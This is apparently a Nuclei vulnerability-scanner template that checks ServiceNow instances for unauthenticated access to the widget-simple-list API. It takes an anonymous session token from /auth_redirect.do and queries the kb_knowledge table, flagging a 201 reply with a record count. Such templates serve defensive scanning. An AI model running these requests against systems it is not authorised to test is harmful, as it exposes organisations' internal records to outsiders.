http:
- attack: pitchfork
  cookie-reuse: true
  extractors:
  - group: 1
    internal: true
    name: USERTOKEN
    part: body
    regex:
    - var g_ck = '([0-9a-zA-Z.]+)';
    type: regex
  matchers:
  - part: body_2
    status:
    - 201
    type: status
  - part: body_2
    type: word
    words:
    - '"count":'
  matchers-condition: and
  payloads:
    servicenow-uris:
    - t=kb_knowledge&f=text
  raw:
  - 'GET /auth_redirect.do HTTP/1.1

    Host: {{Hostname}}

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

    '
  - 'POST /api/now/sp/widget/widget-simple-list?{{servicenow-uris}} HTTP/1.1

    Host: {{Hostname}}

    X-UserToken: {{USERTOKEN}}

    Content-Type: application/json

    Accept: application/json

    Connection: close

    '
id: servicenow-widgets-enumeration-short
info:
  author: notnotnotveg
  description: ServiceNow Widgets Enumeration - Short
  metadata:
    shodan-query: NA
  name: ServiceNow Widgets Enumeration - Short
  reference:
  - https://github.com/aaron-costello/ServiceNow-Schema/blob/main/Filtered_Common_Tables.txt
  - https://github.com/bsysop/servicenow
  severity: high
  tags: ServiceNow
